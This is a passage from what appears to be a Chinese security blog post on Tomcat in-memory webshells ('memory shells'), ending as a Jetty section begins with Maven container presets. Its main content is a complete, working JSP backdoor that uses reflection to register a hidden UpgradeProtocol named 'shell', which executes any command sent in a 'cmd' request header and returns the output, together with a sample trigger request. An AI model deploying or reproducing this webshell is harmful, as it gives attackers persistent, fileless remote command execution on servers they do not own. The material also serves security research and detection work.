UpgradeProtocol <span class="title function_">getUpgradeProtocol</span><span class="params">(String upgradedName)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> httpUpgradeProtocols.get(upgradedName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后在 <code>Http11Processor#service</code> 函数中会调用 <code>UpgradeProtocol</code> 的 <code>accept</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">UpgradeProtocol</span> <span class="variable">upgradeProtocol</span> <span class="operator">=</span> protocol.getUpgradeProtocol(requestedProtocol);</span><br><span class="line"><span class="keyword">if</span> (upgradeProtocol != <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (upgradeProtocol.accept(request)) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br></pre></td></tr></table></figure></div>

<p>因此我们只要能够在 <code>AbstractHttp11Protocol#httpUpgradeProtocols</code> 中注册 <code>UpgradeProtocol</code> 对象并实现 <code>service</code> 方法，就可以实现内存马的功能。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line"><span class="type">Field</span> <span class="variable">conn</span> <span class="operator">=</span> Request.class.getDeclaredField(<span class="string">&quot;connector&quot;</span>);</span><br><span class="line">conn.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Connector</span> <span class="variable">connector</span> <span class="operator">=</span> (Connector) conn.get(req);</span><br><span class="line"><span class="type">Field</span> <span class="variable">proHandler</span> <span class="operator">=</span> Connector.class.getDeclaredField(<span class="string">&quot;protocolHandler&quot;</span>);</span><br><span class="line">proHandler.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">AbstractHttp11Protocol</span> <span class="variable">handler</span> <span class="operator">=</span> (AbstractHttp11Protocol) proHandler.get(connector);</span><br><span class="line">HashMap&lt;String, UpgradeProtocol&gt; upgradeProtocols = <span class="literal">null</span>;</span><br><span class="line"><span class="type">Field</span> <span class="variable">upgradeProtocolsField</span> <span class="operator">=</span> AbstractHttp11Protocol.class.getDeclaredField(<span class="string">&quot;httpUpgradeProtocols&quot;</span>);</span><br><span class="line">upgradeProtocolsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">upgradeProtocols = (HashMap&lt;String, UpgradeProtocol&gt;) upgradeProtocolsField.get(handler);</span><br><span class="line">upgradeProtocols.put(<span class="string">&quot;p4d0rn&quot;</span>, <span class="keyword">new</span> <span class="title class_">MyUpgrade</span>());</span><br><span class="line">upgradeProtocolsField.set(handler, upgradeProtocols);</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>搜索 <code>httpUpgradeProtocols</code> 的相关引用我们发现 <code>AbstractHttp11Protocol#init</code> 会初始化 <code>httpUpgradeProtocols</code>，因此可以确定 <code>httpUpgradeProtocols</code> 是在 Tomcat 启动时被实例化的。因此我们在注册的时候不需要考虑初始化 <code>httpUpgradeProtocols</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 初始化协议处理器。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 关键点：</span></span><br><span class="line"><span class="comment"> * 1) 先配置“可升级协议”（HTTP Upgrade / ALPN 相关），</span></span><br><span class="line"><span class="comment"> *    再调用父类 init 去初始化端点（Endpoint）。</span></span><br><span class="line"><span class="comment"> *    原因：Endpoint 初始化时会根据已注册的升级协议去</span></span><br><span class="line"><span class="comment"> *    生成/公布可协商的协议列表（例如 TLS/ALPN 要广告出去的列表）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 1) 先处理所有可升级协议</span></span><br><span class="line">    <span class="comment">//   （例如 HTTP/2、WebSocket 等，它们实现了 UpgradeProtocol 接口）</span></span><br><span class="line">    <span class="comment">//    注意这里的顺序很重要：Endpoint 的 init（在 super.init() 里）会用到</span></span><br><span class="line">    <span class="comment">//    这些已登记的协议去配置 ALPN 广告列表。</span></span><br><span class="line">    <span class="keyword">for</span> (UpgradeProtocol upgradeProtocol : upgradeProtocols) &#123;</span><br><span class="line">        configureUpgradeProtocol(upgradeProtocol);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将单个 UpgradeProtocol 按不同通道方式登记到相应的表中。</span></span><br><span class="line"><span class="comment"> * 本段只展示了“HTTP Upgrade”通道（明文/加密皆可用：如 websocket、h2c/h2）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">configureUpgradeProtocol</span><span class="params">(UpgradeProtocol upgradeProtocol)</span> &#123;</span><br><span class="line">    <span class="comment">// —— HTTP Upgrade 路径 ——</span></span><br><span class="line">    <span class="comment">// 根据当前端点是否启用 SSL，拿到该协议的 Upgrade 名字。</span></span><br><span class="line">    <span class="comment">// 典型：明文时可能返回 &quot;h2c&quot;；TLS 时返回 &quot;h2&quot;；WebSocket 返回 &quot;websocket&quot;。</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">httpUpgradeName</span> <span class="operator">=</span> upgradeProtocol.getHttpUpgradeName(getEndpoint().isSSLEnabled());</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">httpUpgradeConfigured</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果该协议声明了可通过 HTTP/1.1 Upgrade 头触发的名字，则登记到映射表：</span></span><br><span class="line">    <span class="comment">//   httpUpgradeProtocols.put(协议名, 协议实现)</span></span><br><span class="line">    <span class="comment">// 这样在解析到 Connection: upgrade / Upgrade: &lt;name&gt; 时，就能按名匹配到对应的实现。</span></span><br><span class="line">    <span class="keyword">if</span> (httpUpgradeName != <span class="literal">null</span> &amp;&amp; httpUpgradeName.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        httpUpgradeProtocols.put(httpUpgradeName, upgradeProtocol);</span><br><span class="line">        httpUpgradeConfigured = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 记录一条日志，便于诊断：哪个连接器（getName）配置了哪个 Upgrade 名称</span></span><br><span class="line">        getLog().info(sm.getString(<span class="string">&quot;abstractHttp11Protocol.httpUpgradeConfigured&quot;</span>,</span><br><span class="line">                                   getName(), httpUpgradeName));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<p>并且相较于 Executor 型内存马，Upgrade 型内存马的回调函数 <code>accept</code> 的参数类型是 <code>org.apache.coyote.Request</code>，刚好能通过反射获取到 <code>Response</code> 对象，因此更加通用和稳定。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">accept</span><span class="params">(org.apache.coyote.Request request)</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;MyUpgrade.accept&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">p</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        String[] cmd = System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;windows&quot;</span>) ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, p&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, p&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">response</span> <span class="operator">=</span> org.apache.coyote.Request.class.getDeclaredField(<span class="string">&quot;response&quot;</span>);</span><br><span class="line">        response.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Response</span> <span class="variable">resp</span> <span class="operator">=</span> (Response) response.get(request);</span><br><span class="line">        <span class="type">byte</span>[] result = <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmd).start().getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next().getBytes();</span><br><span class="line">        resp.doWrite(ByteBuffer.wrap(result));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>访问时请求头需要满足：</p>
<ul>
<li><code>Connection</code> 的值包含 <code>Upgrade</code></li>
<li><code>Upgrade</code> 的值为内存马的名称</li>
<li><code>cmd</code> 的值为要执行的命令</li>
</ul>
<div class="code-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Upgrade</span><br><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>shell</span><br><span class="line"><span class="attribute">cmd</span><span class="punctuation">: </span>whoami</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>完整代码如下：</p>
<div class="code-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Connector&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.coyote.http11.AbstractHttp11Protocol&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.coyote.UpgradeProtocol&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.HashMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.coyote.Processor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.net.SocketWrapperBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.coyote.Adapter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyUpgrade</span> <span class="keyword">implements</span> <span class="title class_">UpgradeProtocol</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getHttpUpgradeName</span><span class="params">(<span class="type">boolean</span> isSSLEnabled)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;shell&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">byte</span>[] getAlpnIdentifier() &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getAlpnName</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Processor <span class="title function_">getProcessor</span><span class="params">(SocketWrapperBase&lt;?&gt; socketWrapper, Adapter adapter)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> InternalHttpUpgradeHandler <span class="title function_">getInternalUpgradeHandler</span><span class="params">(Adapter adapter, org.apache.coyote.Request request)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">accept</span><span class="params">(org.apache.coyote.Request request)</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;MyUpgrade.accept&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">p</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            System.out.println(p);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                String[] cmd = System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;windows&quot;</span>) ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, p&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, p&#125;;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">response</span> <span class="operator">=</span> org.apache.coyote.Request.class.getDeclaredField(<span class="string">&quot;response&quot;</span>);</span><br><span class="line">                response.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                org.apache.coyote.<span class="type">Response</span> <span class="variable">resp</span> <span class="operator">=</span> (org.apache.coyote.Response) response.get(request);</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmd).start().getInputStream();</span><br><span class="line">                <span class="type">BufferedReader</span> <span class="variable">stdInput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">                <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="keyword">while</span> ((tmp = stdInput.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    s += tmp;</span><br><span class="line">                &#125;</span><br><span class="line">                resp.setHeader(<span class="string">&quot;Result&quot;</span>, s);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                System.out.println(e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">conn</span> <span class="operator">=</span> Request.class.getDeclaredField(<span class="string">&quot;connector&quot;</span>);</span><br><span class="line">    conn.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Connector</span> <span class="variable">connector</span> <span class="operator">=</span> (Connector) conn.get(req);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">proHandler</span> <span class="operator">=</span> Connector.class.getDeclaredField(<span class="string">&quot;protocolHandler&quot;</span>);</span><br><span class="line">    proHandler.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">AbstractHttp11Protocol</span> <span class="variable">handler</span> <span class="operator">=</span> (AbstractHttp11Protocol) proHandler.get(connector);</span><br><span class="line">    HashMap&lt;String, UpgradeProtocol&gt; upgradeProtocols = <span class="literal">null</span>;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">upgradeProtocolsField</span> <span class="operator">=</span> AbstractHttp11Protocol.class.getDeclaredField(<span class="string">&quot;httpUpgradeProtocols&quot;</span>);</span><br><span class="line">    upgradeProtocolsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    upgradeProtocols = (HashMap&lt;String, UpgradeProtocol&gt;) upgradeProtocolsField.get(handler);</span><br><span class="line">    upgradeProtocols.put(<span class="string">&quot;shell&quot;</span>, <span class="keyword">new</span> <span class="title class_">MyUpgrade</span>());</span><br><span class="line">    upgradeProtocolsField.set(handler, upgradeProtocols);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div>

<h2 id="Jetty-内存马"><a href="#Jetty-内存马" class="headerlink" title="Jetty 内存马"></a>Jetty 内存马</h2><div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- ====== Tomcat 10.1 预设（只改 container.version）====== --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">container.id</span>&gt;</span>tomcat10x<span class="tag">&lt;/<span class="name">container.id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">container.version</span>&gt;</span>10.1.24<span class="tag">&lt;/<span class="name">container.version</span>&gt;</span> <span class="comment">&lt;!-- ★只改这一行 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">container.homeName</span>&gt;</span>apache-tomcat-$&#123;container.version&#125;<span class="tag">&lt;/<span class="name">container.homeName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">container.zipUrl</span>&gt;</span>https://archive.apache.org/dist/tomcat/tomcat-10/v$&#123;container.version&#125;/bin/apache-tomcat-$&#123;container.version&#125;.zip<span class="tag">&lt;/<span class="name">container.zipUrl</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">jsp.group</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">jsp.group</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jsp.artifact</span>&gt;</span>tomcat-jasper<span class="tag">&lt;/<span class="name">jsp.artifact</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jsp.version</span>&gt;</span>$&#123;container.version&#125;<span class="tag">&lt;/<span class="name">jsp.version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">el.group</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">el.group</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el.artifact</span>&gt;</span>tomcat-embed-el<span class="tag">&lt;/<span class="name">el.artifact</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el.version</span>&gt;</span>$&#123;container.version&#125;<span class="tag">&lt;/<span class="name">el.version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Servlet 6（jakarta） --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet.group</span>&gt;</span>jakarta.servlet<span class="tag">&lt;/<span class="name">servlet.group</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet.artifact</span>&gt;</span>jakarta.servlet-api<span class="tag">&lt;/<span class="name">servlet.artifact</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet.version</span>&gt;</span>6.0.0<span class="tag">&lt;/<span class="name">servlet.version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ====== Jetty 10 预设（只改 container.version）====== --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">container.id</span>&gt;</span>jetty10x<span class="tag">&lt;/<span class="name">container.id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">container.version</span>&gt;</span>10.0.18<span class="tag">&lt;/<span class="name">container.version</span>&gt;</span> <span class="comment">&lt;!-- ★只改这一行 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">container.homeName</span>&gt;</span>jetty-home-$&#123;container.version&#125;<span class="tag">&lt;/<span class="name">container.homeName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">container.zipUrl</span>&gt;</span>https://repo1.maven.org/maven2/org/eclipse/jetty/jetty-home/$&#123;container.version&#125;/jetty-home-$&#123;container.version&#125;.zip<span class="tag">&lt;/<span class="name">container.zipUrl</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Jetty 的 JSP 集成 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jsp.group</span>&gt;</span>org.eclipse.jetty<span class="tag">&lt;/<span class="name">jsp.group</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jsp.artifact</span>&gt;</span>apache-jsp<span class="tag">&lt;/<span class="name">jsp.artifact</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jsp.version</span>&gt;</span>$&#123;container.version&#125;<span class="tag">&lt;/<span class="name">jsp.version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- EL / Servlet 走 javax 系列 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el.group</span>&gt;</span>javax.el<span class="tag">&lt;/<span class="name">el.group</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el.artifact</span>&gt;</span>javax.el-api<span class="tag">&lt;/<span class="name">el.artifact</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el.version</span>&gt;</span>3.0.0<span class="tag">&lt;/<span class="name">el.version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet.group</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">servlet.group</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet.artifact</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">servlet.artifact</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet.version</span>&gt;</span>4.0.1<span class="tag">&lt;/<span class="name">servlet.version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ====== Jetty 11 预设（只改 container.version）====== --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">container.id</span>&gt;</span>jetty11x<span class="tag">&lt;/<span class="name">container.id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">container.version</span>&gt;</span>11.0.24<span class="tag">&lt;/<span 